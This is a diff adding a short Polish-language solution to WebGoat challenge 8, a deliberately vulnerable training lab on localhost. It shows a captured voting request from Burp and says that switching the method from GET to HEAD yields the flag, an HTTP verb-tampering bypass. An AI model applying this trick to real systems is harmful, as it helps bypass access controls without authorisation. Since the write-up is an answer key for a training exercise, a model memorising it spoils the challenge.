@@ -1,0 +1,19 @@
+1. Sprawdzamy zapytanie w przypadku oddania głosu w Burpie:
+
+GET /WebGoat/challenge/8/vote/1 HTTP/1.1
+Host: localhost:8080
+sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90"
+Accept: */*
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8080/WebGoat/start.mvc
+Accept-Encoding: gzip, deflate
+Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: JSESSIONID=WKLaX2fVqXdVRYwxOZ6P5EvyUd4bOh1oFEgJpymS
+Connection: close
+
+Zmieniamy GET na HEAD i otrzymujemy flagę.
